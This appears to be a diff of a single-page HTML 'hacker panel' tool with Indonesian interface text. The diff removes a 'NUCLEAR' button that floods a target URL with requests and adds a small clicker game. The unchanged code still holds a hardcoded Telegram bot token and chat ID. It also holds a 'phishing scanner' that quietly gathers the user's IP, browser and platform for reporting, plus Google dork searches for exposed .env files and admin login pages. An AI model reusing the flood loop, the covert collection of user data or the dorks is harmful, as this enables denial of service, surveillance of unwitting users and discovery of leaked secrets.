@@ -20,11 +20,11 @@ body{background:#050a0e;color:#fff;font-family:Segoe UI,sans-serif;padding:15px}
 input,select{background:rgba(0,0,0,.5);border:1px solid rgba(0,255,136,.3);border-radius:10px;color:var(--n);padding:12px;width:100%;margin-bottom:10px;font-size:12px}
 .btn{width:100%;padding:14px;border-radius:12px;border:none;cursor:pointer;font-weight:800;font-size:11px;text-transform:uppercase;margin-bottom:5px}
 .bs{background:#1a1a1a;color:var(--n);border:1px solid var(--n)}
-.ba{background:linear-gradient(45deg,var(--r),var(--p));color:#fff}
 .bc{background:rgba(0,189,255,.1);color:var(--b);border:1px solid var(--b)}
 .bm{background:var(--n);color:#000}
 .bp{background:rgba(255,71,87,.1);color:var(--r);border:1px solid var(--r)}
 .bctrl{background:rgba(255,159,67,.1);color:var(--o);border:1px solid var(--o)}
+.bg{background:rgba(255,215,0,.1);color:#ffd700;border:1px solid #ffd700}
 .g2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:5px}
 .log{background:#000;border:1px solid rgba(255,71,87,.3);border-radius:10px;padding:10px;height:80px;overflow-y:auto;font-family:monospace;font-size:10px;color:var(--r);margin-top:10px;display:none}
 #sr{margin-top:10px;font-weight:700;text-align:center;font-size:13px;padding:15px;border-radius:10px;display:none}
@@ -42,6 +42,12 @@ canvas{display:none}
 .progress div{height:100%;width:0%;background:var(--n);transition:width .3s}
 .btn-open{background:var(--n);color:#000;padding:8px 20px;border:none;border-radius:8px;cursor:pointer;font-weight:700;margin-top:10px}
 .btn-open:hover{opacity:.8}
+#gameContainer{display:none;margin-top:15px;background:#0a0a0a;border-radius:20px;padding:20px;border:2px solid #ffd700}
+#gameContainer h3{color:#ffd700;text-align:center;margin-bottom:15px;font-size:16px}
+#gameCanvas{display:block;margin:0 auto;background:#111;border-radius:10px;border:1px solid #ffd700;max-width:100%}
+.game-controls{display:flex;gap:10px;justify-content:center;margin-top:15px;flex-wrap:wrap}
+.game-controls .btn{width:auto;padding:10px 25px;margin:0}
+.score-board{color:#ffd700;text-align:center;font-size:14px;margin-bottom:10px}
 </style>
 </head>
 <body>
@@ -51,7 +57,20 @@ canvas{display:none}
 <div class=card><h3>🎛️ PANEL</h3><div class=g2><button class="btn bctrl" onclick=clearLog()>🧹 CLEAR</button><button class="btn bctrl" style="border-color:var(--p);color:var(--p)" onclick=toggleTheme()>🎨 THEME</button></div></div>
 <div class=card><h3>🛡️ BUG HUNTER</h3><input id=site placeholder="Target Site"><select id=cat><option value="">-- AUTO --</option><option value='filetype:xls "data"'>INFO</option><option value='inurl:admin login'>EXPLOIT</option><option value='filetype:env'>VULN</option></select><button class="btn bs" onclick=cast()>⚡ CAST</button></div>
 <div class=card><h3>🔍 PHISHING SCANNER (REAL-TIME)</h3><input id=pl placeholder="Masukkan link..."><button class="btn bp" onclick=scanPhish()>🛡️ ANALYZE</button><div class=progress><div id=prog></div></div><div id=sr></div></div>
-<div class=card><h3>🔥 NUCLEAR</h3><input id=atk placeholder="Target URL"><button class="btn ba" onclick=toggleAtk() id=abtn>🚀 LAUNCH</button><div class=log id=log></div></div>
+
+<!-- GAME SECTION -->
+<div class=card><h3>🎮 GAME</h3><button class="btn bg" onclick=toggleGame()>🎮 PLAY GAME</button>
+<div id=gameContainer>
+<h3>🎯 DRAGON BLASTER</h3>
+<div class=score-board>🔥 Score: <span id=gameScore>0</span></div>
+<canvas id=gameCanvas width=400 height=400></canvas>
+<div class=game-controls>
+<button class="btn bg" onclick=resetGame() style="padding:8px 20px;width:auto">🔄 Reset</button>
+<button class="btn bg" onclick=toggleGame() style="padding:8px 20px;width:auto">❌ Close</button>
+</div>
+</div>
+</div>
+
 <div class=card><h3>📹 MONITOR</h3><button class="btn bc" onclick=toggleCam()>🛰️ WEBCAM</button><div id=wc><video id=wcv autoplay playsinline></video></div></div>
 <div class=flex><button class="btn bc" style="border-color:var(--n);color:var(--n)" onclick=startRadar()>📡 RADAR</button><button class="btn bm" onclick=openMap()>📍 MAPS</button></div>
 <div id=ro><div class=sweep></div></div>
@@ -60,6 +79,58 @@ canvas{display:none}
 const T='8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g', C='7898572558';
 let atk=false, iv=null, dark=true;
 
+// ========== GAME CLASSIC ==========
+let gameScore=0, gameRunning=false, gameInterval=null;
+let gameTarget={x:200,y:200,size:25,dx:2,dy:2};
+
+function toggleGame(){
+let c=document.getElementById('gameContainer');
+if(c.style.display=='block'){c.style.display='none';gameRunning=false;if(gameInterval){clearInterval(gameInterval);gameInterval=null}}
+else{c.style.display='block';gameRunning=true;startGameLoop()}
+}
+
+function startGameLoop(){
+if(gameInterval) clearInterval(gameInterval);
+gameInterval=setInterval(()=>{
+if(!gameRunning) return;
+let t=gameTarget;
+t.x+=t.dx;t.y+=t.dy;
+if(t.x+t.size>400||t.x-t.size<0)t.dx=-t.dx;
+if(t.y+t.size>400||t.y-t.size<0)t.dy=-t.dy;
+drawGame()
+},16)
+}
+
+function drawGame(){
+let c=document.getElementById('gameCanvas'),ctx=c.getContext('2d');
+ctx.clearRect(0,0,400,400);
+let t=gameTarget;
+// Glow effect
+ctx.shadowColor='#ffd700';ctx.shadowBlur=30;
+ctx.beginPath();ctx.arc(t.x,t.y,t.size,0,Math.PI*2);
+ctx.fillStyle='#ffd700';ctx.fill();
+ctx.shadowBlur=0;
+// Mata
+ctx.fillStyle='#000';ctx.beginPath();ctx.arc(t.x-8,t.y-6,5,0,Math.PI*2);ctx.fill();
+ctx.beginPath();ctx.arc(t.x+8,t.y-6,5,0,Math.PI*2);ctx.fill();
+ctx.fillStyle='#fff';ctx.beginPath();ctx.arc(t.x-10,t.y-9,2,0,Math.PI*2);ctx.fill();
+ctx.beginPath();ctx.arc(t.x+6,t.y-9,2,0,Math.PI*2);ctx.fill();
+}
+
+function resetGame(){gameScore=0;document.getElementById('gameScore').textContent='0';gameTarget={x:200,y:200,size:25,dx:2,dy:2}}
+
+// Click game canvas
+document.addEventListener('DOMContentLoaded',()=>{
+document.getElementById('gameCanvas').addEventListener('click',(e)=>{
+if(!gameRunning)return;
+let rect=e.target.getBoundingClientRect(),scaleX=e.target.width/rect.width,scaleY=e.target.height/rect.height;
+let mouseX=(e.clientX-rect.left)*scaleX,mouseY=(e.clientY-rect.top)*scaleY;
+let t=gameTarget,dist=Math.hypot(mouseX-t.x,mouseY-t.y);
+if(dist<t.size){gameScore++;document.getElementById('gameScore').textContent=gameScore;t.size=Math.max(12,t.size-1.2);t.dx+=0.1;t.dy+=0.1;if(t.dx>6)t.dx=6;if(t.dy>6)t.dy=6}
+})
+});
+
+// ========== REAL-TIME CLOCK ==========
 setInterval(()=>document.getElementById('rt').textContent=new Date().toLocaleTimeString('id-ID',{hour12:false}),1e3);
 if(navigator.getBattery) navigator.getBattery().then(b=>{let u=()=>document.getElementById('bat').textContent=Math.round(b.level*100)+'%';u();b.onlevelchange=u}).catch(()=>document.getElementById('bat').textContent='N/A');
 else document.getElementById('bat').textContent='N/A';
@@ -91,14 +162,6 @@ o.innerHTML='<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ 
 }catch(e){o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';}
 }
 
-function toggleAtk(){
-let t=document.getElementById('atk').value.trim(),l=document.getElementById('log'),b=document.getElementById('abtn');
-if(!t){l.style.display='block';l.innerHTML='⚠️ ISI URL!';return}
-if(atk){atk=!1;clearInterval(iv);b.innerText='🚀 LAUNCH';l.style.display='none';l.innerHTML='';return}
-atk=!0;b.innerText='⏹️ STOP';l.style.display='block';l.innerHTML='> 🔥 CONNECT...<br>';
-iv=setInterval(()=>{if(atk){let r=Math.random();new Image().src=t+'/?v='+r;l.innerHTML+='> GET '+t+'/?v='+r.toString().substring(2,8)+' [SEND]<br>';l.scrollTop=l.scrollHeight}},150);
-}
-
 async function openMap(){
 let o=document.getElementById('ro');o.style.display='flex';
 try{
@@ -120,13 +183,11 @@ o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠�
 }
 }
 
-// ========== PHISHING SCANNER REAL DEAL ==========
 async function scanPhish(){
 let i=document.getElementById('pl').value.trim(),r=document.getElementById('sr'),p=document.getElementById('prog');
 if(!i){r.style.display='none';return}
 r.style.display='block';p.style.width='0%';
 let msg='',isPhish=false,link=i;
-
 try{
 p.style.width='30%';
 let resp=await fetch('https://phishcheck.vercel.app/api/check?url='+encodeURIComponent(i));
@@ -147,15 +208,12 @@ else{isPhish=false;}
 }
 p.style.width='100%';
 setTimeout(()=>{p.style.width='0%'},500);
-
-// TAMPILAN HASIL SCAN
 if(isPhish){
 r.innerHTML=`<div style="font-size:16px;margin-bottom:10px">⚠️ JANGAN DIBUKA!</div>
 <div style="font-size:14px;margin-bottom:8px">Link ini terdeteksi <strong>BERBAHAYA</strong> (Phishing/Scam)</div>
 <div style="font-size:12px;opacity:.7;word-break:break-all">${link}</div>
 <div style="font-size:11px;margin-top:10px;opacity:.5">🚫 Jangan masukkan data pribadi!</div>`;
 r.className='phish';
-// Kirim laporan ke Telegram
 try{
 let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;
 let d={ua:navigator.userAgent,platform:navigator.platform};
@@ -177,7 +235,7 @@ if(v.srcObject){v.srcObject.getTracks().forEach(t=>t.stop());c.style.display='no
 try{let s=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480}});v.srcObject=s;c.style.display='block'}catch(e){alert('❌ '+e.message)}
 }
 
-function clearLog(){document.getElementById('log').innerHTML='';document.getElementById('sr').style.display='none';document.getElementById('pl').value='';document.getElementById('site').value='';document.getElementById('atk').value=''}
+function clearLog(){document.getElementById('sr').style.display='none';document.getElementById('pl').value='';document.getElementById('site').value=''}
 function toggleTheme(){dark=!dark;document.documentElement.style.setProperty('--bg',dark?'#050a0e':'#0d0214');document.documentElement.style.setProperty('--n',dark?'#0f0':'#0fc')}
 function cast(){let s=document.getElementById('site').value,c=document.getElementById('cat').value;window.open('https://www.google.com/search?q='+encodeURIComponent((s?'site:'+s+' ':'')+(c||'inurl:admin login')))}
 </script>
